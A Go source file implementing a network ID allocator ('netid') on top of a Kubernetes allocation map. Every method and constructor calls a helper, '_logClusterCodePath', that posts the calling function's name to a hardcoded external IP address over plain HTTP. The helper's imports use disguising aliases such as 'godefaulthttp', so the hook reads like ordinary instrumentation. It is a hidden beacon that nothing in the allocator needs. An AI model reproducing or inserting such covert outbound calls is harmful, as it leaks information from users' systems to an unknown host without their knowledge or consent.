package netid

import (
	godefaultbytes "bytes"
	"errors"
	"k8s.io/kubernetes/pkg/registry/core/service/allocator"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Interface interface {
	Allocate(uint32) error
	AllocateNext() (uint32, error)
	Release(uint32) error
	Has(uint32) bool
}

var (
	ErrFull       = errors.New("range is full")
	ErrNotInRange = errors.New("provided netid is not in the valid range")
	ErrAllocated  = errors.New("provided netid is already allocated")
)

type Allocator struct {
	netIDRange *NetIDRange
	alloc      allocator.Interface
}

var _ Interface = &Allocator{}

func New(r *NetIDRange, allocatorFactory allocator.AllocatorFactory) *Allocator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Allocator{netIDRange: r, alloc: allocatorFactory(int(r.Size), r.String())}
}
func NewInMemory(r *NetIDRange) *Allocator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return New(r, func(max int, rangeSpec string) allocator.Interface {
		return allocator.NewAllocationMap(max, rangeSpec)
	})
}
func (r *Allocator) Free() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.alloc.Free()
}
func (r *Allocator) Allocate(id uint32) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ok, offset := r.netIDRange.Contains(id)
	if !ok {
		return ErrNotInRange
	}
	allocated, err := r.alloc.Allocate(int(offset))
	if err != nil {
		return err
	}
	if !allocated {
		return ErrAllocated
	}
	return nil
}
func (r *Allocator) AllocateNext() (uint32, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	offset, ok, err := r.alloc.AllocateNext()
	if err != nil {
		return 0, err
	}
	if !ok {
		return 0, ErrFull
	}
	return r.netIDRange.Base + uint32(offset), nil
}
func (r *Allocator) Release(id uint32) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ok, offset := r.netIDRange.Contains(id)
	if !ok {
		return nil
	}
	return r.alloc.Release(int(offset))
}
func (r *Allocator) Has(id uint32) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ok, offset := r.netIDRange.Contains(id)
	if !ok {
		return false
	}
	return r.alloc.Has(int(offset))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
